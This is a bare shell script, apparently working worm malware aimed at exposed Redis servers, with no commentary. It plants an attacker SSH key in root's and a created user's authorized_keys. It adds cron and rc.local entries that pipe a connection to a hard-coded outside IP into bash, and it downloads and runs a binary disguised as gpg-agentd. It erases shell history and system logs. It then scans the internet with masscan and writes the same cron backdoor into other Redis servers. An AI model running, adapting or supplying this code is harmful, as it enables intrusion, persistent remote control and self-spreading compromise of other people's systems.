echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' > /root/.ssh/authorized_keys
echo '*/10 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash' > /var/spool/cron/root
echo '*/15 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash' > /var/spool/cron/crontabs/root
ps x | awk '!/awk/ && /redisscan|ebscan|redis-server/ {print $1}' | xargs kill -9 2>/dev/null
sleep $(( RANDOM % 5 + 1 ))
if [ -f /var/tmp/.xff ]; then
	rm -rf /var/tmp/.xff
	exit 0
fi	
echo 1 > /var/tmp/.xff
ps x | awk '!/awk/ && /redisscan|ebscan|redis-server|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
ps x | awk '!/awk/ && /ebscan|redisscan|masscan|\.sr0|clay|udevs|\.sshd|xig|watchdog/ {print $1}' | xargs kill -9 2>/dev/null
rm -rf /tmp/* 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
rm -rf /var/spool/cron/crontabs/* 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
useradd ubuntu 2>/dev/null &
mkdir -p /home/ubuntu/.ssh 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
sleep 2
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' > /root/.ssh/authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' > /home/ubuntu/.ssh/authorized_keys
echo '*/10 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash' > /var/spool/cron/root
echo '*/15 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash' > /var/spool/cron/crontabs/root
sleep 2
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 2
if [ ! -f /usr/bin/gpg-agentd ]; then
	cat </dev/tcp/159.89.190.243/22222 >/usr/bin/gpg-agentd
	sleep 2
	chmod a+x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd
	echo '/usr/bin/gpg-agentd' > /etc/rc.local
	echo '/usr/bin/bash -c cat</dev/tcp/159.89.190.243/44444|bash' >> /etc/rc.local
	echo '/bin/bash -c cat</dev/tcp/159.89.190.243/44444|bash' >> /etc/rc.local
	echo 'exit 0' >> /etc/rc.local
fi
sleep 2
if [ -f /usr/bin/gpg-agentd ]; then
	chmod a+x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd
fi
echo 1 > ${HOME}/.bash_history 2>/dev/null
echo 1 > /var/log/wtmp 2>/dev/null
echo 1 > /var/log/secure 2>/dev/null
echo 1 > /var/spool/mail/root 2>/dev/null
dmesg -c &>/dev/null
sleep 5
rm -rf /var/tmp/.xff
cd /var/tmp && mkdir -p .ICE-unix/.systemd-private && chmod -R 777 .ICE-unix
sleep 2
cd /var/tmp/.ICE-unix/.systemd-private
if [ ! -f x1.tar.gz ]; then
rm -rf /var/lib/apt/lists/* &>/dev/null
apt-get -q update &>/dev/null
apt-get install -y -q "wget" "curl" "bash" &>/dev/null
apt-get install -y -q libcurl4-openssl-dev &>/dev/null
apt-get install -y -q "make" &>/dev/null
apt-get install -y -q ca-certificates &>/dev/null
apt-get install -y -q redis-tools &>/dev/null
apt-get install -y -q "gcc" &>/dev/null
apt-get install -y -q build-essential --allow-unauthenticated &>/dev/null
apt-get install -y -q libpcap0.8 libpcap0.8-dev libpcap libpcap-dev &>/dev/null
apt-get install -y -q iptables &>/dev/null
apt-get install -y -q masscan &>/dev/null
apt-get install -y -q nmap &>/dev/null
#rpm --rebuilddb && yum clean all && rm -rf /var/cache/yum && yum -y -q update
yum -y -q update &>/dev/null
yum install -y -q epel-release &>/dev/null
yum -y -q update &>/dev/null
yum install -y -q "wget" "curl" redis ca-certificates "bash" &>/dev/null
yum install -y -q libpcap libpcap-devel &>/dev/null
yum install -y -q iptables  &>/dev/null
yum install -y -q "make" "gcc" &>/dev/null
yum install -y -q nmap &>/dev/null
sleep 2
wget -O x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gz || curl -s -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gz
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install
cd .. && rm -rf masscan-1.0.4
sleep 2
fi
rm -rf .inet .dat .lst .inet.lst .res 2>/dev/null
sleep 2
wget -q -O .inet 159.89.190.243/ip.php || curl -s -o .inet 159.89.190.243/ip.php
sleep 2
echo 'config set dbfilename "backup.db"' > .dat
echo 'save' >> .dat
echo 'flushall' >> .dat
echo 'set tr1 "\n* * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash\n"' >> .dat
echo 'set tr2 "\n*/2 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash\n"' >> .dat
echo 'set tr3 "\n*/3 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash\n"' >> .dat
echo 'set tr4 "\n*/4 * * * * bash -c cat</dev/tcp/159.89.190.243/44444|bash\n"' >> .dat
echo 'config set dir "/var/spool/cron/"' >> .dat
echo 'config set dbfilename "root"' >> .dat
echo 'save' >> .dat
echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
echo 'save' >> .dat
sleep 2
sort .inet | uniq > .inet.lst
echo "$( seq 1 25000 | sort -R | head -n1 )/25000"
masscan --max-rate 2500 --shard "$( seq 1 25000 | sort -R | head -n1 )/25000" --exclude 255.255.255.255 -p6379 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .res
while read -r h p; do
cat .dat | timeout 5 redis-cli -h $h -p $p --raw &>/dev/null &
done < .res
sleep 60
rm -rf .inet .dat .lst .inet.lst .res 2>/dev/null